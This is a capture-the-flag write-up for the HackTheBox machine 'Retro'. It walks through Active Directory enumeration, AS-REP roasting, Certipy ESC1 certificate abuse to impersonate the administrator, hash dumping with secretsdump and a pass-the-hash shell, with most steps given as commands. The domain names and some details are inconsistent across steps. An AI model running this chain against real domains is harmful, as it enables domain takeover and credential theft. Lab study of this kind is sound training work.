---
layout: writeup
name: "Retro"
platform: "HackTheBox"
category: "retired"
difficulty: "Medium"
permalink: /writeups/retired/retro/
date: 2026-02-25
pwned: true
---
# 🧠 Hack The Box - Retro

**Difficulty:** Medium  
**IP Address:** 10.129.234.44  
**Date Completed:** 2025-06-25  

## 🧭 Overview
Retro was an ADCS-themed Windows box focused on certificate abuse for privilege escalation. While the core exploitation path was standard, the real challenge came from getting tooling (especially Certipy) to work correctly due to domain resolution and legacy configuration quirks.

## 🔎 Enumeration
### Nmap
```bash
nmap -p- -T4 -v 10.129.234.44 --min-rate 10000 -oA nmap/full
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389 -sC -sV -oA nmap/scripts 10.129.234.44
```
- Standard Windows AD ports were open.
- Web server hosted static site.

### Web Enum
- Nothing dynamic or juicy from the website.

## 🪪 Kerberos & Users
```bash
# Using kerbrute to enumerate usernames
kerbrute userenum --dc 10.129.234.44 -d retro.htb users.txt
```
- Found user: `trainee`

```bash
# AS-REP roasting test
impacket-GetNPUsers retro.htb/ -dc-ip 10.129.234.44 -usersfile users.txt -format hashcat
```
- `trainee` required pre-auth.

## 🏛️ LDAP & BloodHound
```bash
# Enumerate LDAP as 'trainee'
python3 ldapdomaindump.py -u trainee -p trainee -d retro.htb -ip 10.129.234.44
```
- Discovered computer account: `banking$`
- Password policy showed computers can authenticate with their default passwords.

## 🔐 Certipy Enumeration
Initial attempts with Certipy v5.x failed due to RPC and DNS errors.

```bash
# Critical fix: /etc/hosts and krb5.conf must reflect internal domain `retro.vl`
echo "10.129.234.44 dc.retro.vl" | sudo tee -a /etc/hosts
```
```ini
# /etc/krb5.conf
[libdefaults]
	default_realm = RETRO.VL

dns_lookup_realm = false

dns_lookup_kdc = false

[realms]
	RETRO.VL = {
		kdc = dc.retro.vl
		admin_server = dc.retro.vl
	}
```

```bash
# Certipy find
certipy find -u trainee@retro.vl -p trainee -vulnerable -stdout
```
- `RetroClients` template vulnerable to ESC1.
- `banking$` had enroll rights.

## 🪪 Certificate Request & Privilege Escalation
```bash
certipy req -u 'banking$@dc.retro.htb' -p 'Password123' \
  -ca 'retro-DC-CA' -target 'retro.htb' -template 'RetroClients' \
  -upn 'administrator@retro.htb' -dns 'retro.htb' -key-size 4096
```
- Certificate saved to: `administrator_retro.pfx`

```bash
# Get TGT from certificate
certipy auth -pfx administrator_retro.pfx -domain retro.htb
```

```bash
# Dump hashes
secretsdump.py -k -no-pass retro.htb/administrator@10.129.234.44
```
- Extracted NTLM hash for `administrator`.

## 🪟 Shell Access
```bash
impacket-wmiexec administrator@10.129.234.44 -hashes :<NTLM_HASH>
```
- SYSTEM shell achieved.

## 🎓 Lessons Learned
- Certipy 5.x requires precise DNS/Kerberos setup. Legacy boxes may need `/etc/hosts` and `krb5.conf` tweaks.
- Default machine account passwords can offer privilege escalation via ESC1.
- Enum first: no cert abuse without valid UPN and template path.

---
✅ **Box complete**

